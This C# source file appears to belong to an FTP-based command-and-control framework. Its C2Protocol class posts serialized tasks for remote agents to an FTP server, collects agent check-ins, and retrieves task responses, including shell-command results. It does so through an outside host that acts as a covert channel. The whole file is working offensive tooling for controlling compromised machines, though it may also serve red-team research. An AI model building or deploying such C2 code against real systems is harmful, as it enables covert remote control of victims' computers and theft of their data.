using FtpAgent;
using FtpC2.Responses;
using FtpC2.Tasks;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace FtpC2
{
    internal class C2Protocol
    {        
        private readonly FtpHelper? FTP;        

        public C2Protocol(string host, string username, string password, bool secure)
        {
            this.FTP = new(host, username, password, secure);
        }

        public void RegisterNewTask(TaskWrapper task)
        {
            if (this.FTP == null)
                return;            

            string jsonData = JsonSerializer.Serialize(task, task.GetType());            

            this.FTP.UploadString(jsonData, $"{Shared.PlaceHolders.TaskRequest}.{task.Id}.{task.AgentId}");
        }

        public void RefreshAgents(ConcurrentDictionary<Guid /* AgentId */, Agent> agents)
        {
            if (this.FTP == null)
                return;

            List<string> files = this.FTP.ListDirectory();

            foreach (string file in files)
            {
                if (!file.StartsWith(Shared.PlaceHolders.AgentInformation))
                    continue;
                try
                {
                    string[] pieces = file.Split(".");
                    if (pieces.Length != 2)
                        throw new Exception("The target file does not conform to the expected file name pattern.");
                    
                    Guid agentSession = Guid.Parse(pieces[1]);

                    string jsonData = this.FTP.DownloadString(file);

                    Agent? agent = JsonSerializer.Deserialize<Agent>(jsonData);

                    if (agent != null && agent.Id == agentSession)                    
                        agents.AddOrUpdate(agentSession, agent, (key, oldValue) => agent);                    
                }
                catch
                {
                    //  In the event of a malformed agent, it is crucial to remove it
                    //  from the remote server. This preemptive action is necessary to prevent
                    //  a constant loop with each iteration, which would lead to unwarranted
                    //  resource consumption.
                    try
                    {
                        this.FTP.DeleteFile(file);
                    }
                    catch { }
                }                    
            }
        }
        
        public void EnumerateResponses(ConcurrentDictionary<Guid /* Agent */, ResponseWrapper> responses)
        {
            if (this.FTP == null)
                return;

            List<string> files = this.FTP.ListDirectory();

            foreach (string file in files)
            {
                if (!file.StartsWith(Shared.PlaceHolders.ResponseRequest))
                    continue;               
                try
                {
                    string[] pieces = file.Split(".");
                    if (pieces.Length != 3)
                        throw new Exception("The target file does not conform to the expected file name pattern.");

                    Guid taskSession = Guid.Parse(pieces[1]);
                    Guid agentSession = Guid.Parse(pieces[2]);                        
                
                    string jsonData = this.FTP.DownloadString(file);

                    ResponseWrapper? wrappedResponse = JsonSerializer.Deserialize<ResponseWrapper>(jsonData);
                    ResponseWrapper? response = null;

                    if (wrappedResponse != null && wrappedResponse.TaskId == taskSession && wrappedResponse.AgentId == agentSession)
                    {
                        switch (wrappedResponse.ResponseType)
                        {
                            case "ResponseShellCommand":
                                {
                                    response = JsonSerializer.Deserialize<ResponseShellCommand>(jsonData);                                 

                                    break;
                                }

                            case "ResponseNotification":
                                {
                                    response = JsonSerializer.Deserialize<ResponseNotification>(jsonData);

                                    break;
                                }

                                // Add your additional response classes here
                                // ...
                        }

                        if (response != null) 
                        {
                            if (!responses.ContainsKey(taskSession))
                                responses.TryAdd(taskSession, response);
                        }                            
                    }
                }
                catch
                {
                    //  In the event of a malformed task response, it is crucial to remove it
                    //  from the remote server. This preemptive action is necessary to prevent
                    //  a constant loop with each iteration, which would lead to unwarranted
                    //  resource consumption.
                    try
                    {
                        this.FTP.DeleteFile(file);
                    }
                    catch { }
                }
            }
        }
    }
}
